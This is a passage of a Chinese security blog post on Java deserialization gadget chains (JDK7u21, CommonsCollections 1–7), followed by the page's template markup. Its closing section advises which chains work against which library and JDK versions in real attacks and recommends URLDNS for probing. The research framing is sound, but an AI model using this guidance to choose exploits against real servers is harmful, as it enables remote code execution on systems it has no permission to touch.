class="params">(当前的map.value)</span><span class="string">.hashCode</span><span class="params">()</span></span><br><span class="line">        Map<span class="params">(Proxy)</span><span class="string">.equals</span><span class="params">()</span></span><br><span class="line">            AnnotationInvocationHandler.invoke<span class="params">()</span></span><br><span class="line">                AnnotationInvocationHandler.equalsImpl<span class="params">()</span></span><br><span class="line">                    TemplatesImpl.getOutputProperties<span class="params">()</span></span><br><span class="line">                        TemplatesImpl.newTransformer<span class="params">()</span></span><br><span class="line">                            <span class="string">...</span> <span class="string">//</span> tempalte gadget</span><br></pre></td></tr></table></figure></p>
+<p>之后不能用的原因就是官方在<code>readObject</code>中校验了<code>type</code>类型，只允许为<code>Annotation.class</code><br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200208214512.png" alt></p>
+<h1 id="云玩家感言"><a href="#云玩家感言" class="headerlink" title="云玩家感言"></a>云玩家感言</h1><p>对，没错，就是我，新链又不挖，只会说说。</p>
+<p>分析之后发现很多CommonsCollections的gadget都是杂交而来的。<br>但也确实是个很好的办法，这样就相当于拓展了反序列化的触发点，只要能够触发到已存在的gadget上的一环，就可以接上之前的gadget。<br>比如网上看到的一些师傅找到的新链<br><a href="http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/" target="_blank" rel="noopener">http://blog.0kami.cn/2019/10/31/study-java-deserialized-commonscollections3-others/</a><br><a href="http://blog.0kami.cn/2019/11/10/study-java-deserialized-shiro-1-2-4/" target="_blank" rel="noopener">http://blog.0kami.cn/2019/11/10/study-java-deserialized-shiro-1-2-4/</a><br><a href="https://meizjm3i.github.io/2019/07/07/Commons-Collections%E6%96%B0%E5%88%A9%E7%94%A8%E9%93%BE%E6%8C%96%E6%8E%98%E5%8F%8AWCTF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF%E4%B8%B2%E8%AE%B2/" target="_blank" rel="noopener">https://meizjm3i.github.io/2019/07/07/Commons-Collections%E6%96%B0%E5%88%A9%E7%94%A8%E9%93%BE%E6%8C%96%E6%8E%98%E5%8F%8AWCTF%E5%87%BA%E9%A2%98%E6%80%9D%E8%B7%AF%E4%B8%B2%E8%AE%B2/</a></p>
+<p>都是在原来的基础上改动了之后变成了新的链，不过shiro中的commons-collection3的链确实还是比较有实际意义的。</p>
+<p>如果还是以commons-collection为基础，感觉可以关注<code>org.apache.commons.collections4.functors.*</code>中所有的<code>Transformer</code><br>里面远不止payload中的那些<code>Transformer</code>，以梅子酒师傅的gadget为例，就是重新找了个功能类似的<code>Transformer</code></p>
+<p>之前分析过的gadgetinspector就是一款自动化的gadget分析工具，通过数据流分析来寻找新的gadget<br>但是数据流分析比较重要的问题就是污点信息的跟踪，无法涵盖到尽可能多的函数时，污点信息很容易就跟丢了。<br>而且对于一些动态语法的跟踪，静态分析会显得无能为力，就像<code>InvokerTransformer</code>中的invoke就很难判断。<br>比较好的方式是从<code>Map.get</code>这些地方当作sink点来找新的链。</p>
+<h1 id="总结一下实战中的payload使用"><a href="#总结一下实战中的payload使用" class="headerlink" title="总结一下实战中的payload使用"></a>总结一下实战中的payload使用</h1><p>实战中，真的需要漏洞利用时，一般都会选用CommonsCollections的利用链，但是实际使用时，一些利用链经常触发不了，这里稍微总结一下原因，和最优利用链。</p>
+<h2 id="CommonsCollections1-1"><a href="#CommonsCollections1-1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><p>针对<code>commons-collections3.1</code><br>前面也提到过了，对于高版本的jdk8是不能用的，那具体是多高呢，我也不清楚，总之本地测试是<code>jdk8_u40</code>是可以利用的，<code>jdk8_u112</code>是无法利用的。<br>所以总体来说，可以利用的版本还是比较低的。</p>
+<h2 id="CommonsCollection2"><a href="#CommonsCollection2" class="headerlink" title="CommonsCollection2"></a>CommonsCollection2</h2><p>针对<code>commons-collections4.0</code><br>比较好的一个触发链，11的版本中都可以用</p>
+<h2 id="CommonsCollection3"><a href="#CommonsCollection3" class="headerlink" title="CommonsCollection3"></a>CommonsCollection3</h2><p>针对<code>commons-collections3.1</code><br>和CommonsCollection1一样，前面也是调用的<code>AnnotationInvocationHandler</code>动态代理，导致1不能用的同时3也一样无法利用。</p>
+<h2 id="CommonsCollection4"><a href="#CommonsCollection4" class="headerlink" title="CommonsCollection4"></a>CommonsCollection4</h2><p>针对<code>commons-collections4.0</code><br>也是一样都可以触发</p>
+<h2 id="CommonsCollection5"><a href="#CommonsCollection5" class="headerlink" title="CommonsCollection5"></a>CommonsCollection5</h2><p>针对<code>commons-collections3.1</code><br>由于将1中的<code>AnnotationInvocationHandler</code>变成了<code>BadAttributeValueExpException</code><br>从而解决了1中无法利用的问题</p>
+<h2 id="CommonsCollection6"><a href="#CommonsCollection6" class="headerlink" title="CommonsCollection6"></a>CommonsCollection6</h2><p>针对<code>commons-collections3.1</code><br>前半部分的触发链根据HashSet而来，从而也没有了版本限制</p>
+<h2 id="CommonsCollection7"><a href="#CommonsCollection7" class="headerlink" title="CommonsCollection7"></a>CommonsCollection7</h2><p>针对<code>commons-collections3.1</code><br>前半部分的触发链根据HashTable而来，从而也没有了版本限制</p>
+<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>所以，这样看来，其实只有1和3是某些情况下无法利用的。<br>所以之前看别人payload时经常选用的也就是4、5。<br>不过5貌似有个security manager的限制，多一事不如少一事，所以个人感觉还是推荐6、7.<br>一般来说，试了4、6之后都无法利用，就表示4.0和3.1的gadget不存在。（shiro那种自定义类加载的情况除外）</p>
+<p>一般测试的话最好选用URLDNS，对环境要求小（shell沙箱之类的），而且没有限制<br>Jdk7u21最适合演示危害的时候用了，不用添加额外gadget，就能rce，坏处就是一些万一不支持jdk7就尴尬了。</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2020/03/Tomcat中一种半通用回显方法/" data-toggle="tooltip" data-placement="top" title="Tomcat中一种半通用回显方法">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2020/01/gadgetinspector源码浅析/" data-toggle="tooltip" data-placement="top" title="gadgetinspector源码浅析">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
